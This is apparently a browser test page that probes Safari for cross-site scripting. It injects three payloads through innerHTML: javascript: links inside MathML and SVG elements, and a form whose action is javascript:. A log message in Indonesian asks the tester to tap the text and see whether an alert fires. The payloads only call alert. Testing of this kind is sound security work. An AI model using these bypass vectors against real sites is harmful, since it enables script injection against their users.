<!DOCTYPE html>
<html>
<body>
<h2>MathML XSS Test - Safari Only</h2>
<pre id="log"></pre>
<div id="test"></div>
<script>
let log = m=>document.getElementById('log').textContent+=m+"\n";

// Test 1: MathML + href javascript:
try{
  let div = document.getElementById('test');
  div.innerHTML = `<math><mtext href="javascript:alert(document.domain)">CLICK ME - Safari XSS</mtext></math>`;
  log("MathML with javascript: href injected");
  log("Tap tulisan CLICK ME di atas, kalau alert muncul = XSS BUG");
}catch(e){ log("MathML error: "+e) }

// Test 2: SVG + animate + href (Safari bypass)
try{
  let div2 = document.createElement('div');
  div2.innerHTML = `<svg><a href="javascript:alert(2)"><text x="20" y="20">SVG JS LINK</text></a></svg>`;
  document.body.appendChild(div2);
  log("SVG javascript: injected, tap SVG JS LINK");
}catch(e){ log("SVG error: "+e) }

// Test 3: form + math + action javascript:
try{
  let div3 = document.createElement('div');
  div3.innerHTML = `<math><mtext><form action="javascript:alert(3)"><input type=submit value="FORM JS"></form></mtext></math>`;
  document.body.appendChild(div3);
  log("Form javascript: in MathML injected");
}catch(e){}
</script>
</body>
</html>
